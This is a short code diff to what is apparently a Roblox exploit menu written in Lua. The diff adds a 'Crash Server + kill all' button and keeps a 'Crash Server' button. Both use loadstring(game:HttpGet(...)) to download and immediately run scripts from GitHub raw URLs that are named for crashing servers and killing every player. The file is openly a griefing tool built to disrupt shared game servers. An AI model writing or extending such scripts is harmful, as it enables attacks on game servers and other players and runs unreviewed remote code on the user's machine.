@@ -278,10 +278,14 @@ gearwall:NewButton("Hedgehog Cannon", ":3", function()
           
   end)
   -- game breaking shit
-  gearwall4:NewButton("Crash Server", ":3", function()
+
+  gearwall4:NewButton("Crash Server + kill all", ":3", function()
         typegear("83704165")
   loadstring(game:HttpGet('https://raw.githubusercontent.com/zephyr10101/sword-kill-all/main/script'))()
         
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/the-sweat-list/refs/heads/main/server%20crash"))()
+  end)
+      gearwall4:NewButton("Crash Server", ":3", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/the-sweat-list/refs/heads/main/server%20crash"))()
   end)
   gearwall4:NewButton("Sword Kill All (Requires Ice Dagger)", ":3", function()
